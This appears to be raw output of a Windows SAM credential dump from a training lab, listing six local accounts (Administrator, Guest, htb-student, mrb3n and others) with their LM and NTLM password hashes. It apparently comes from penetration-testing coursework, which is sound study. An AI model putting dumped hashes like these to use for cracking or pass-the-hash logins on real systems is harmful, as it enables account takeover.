Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
```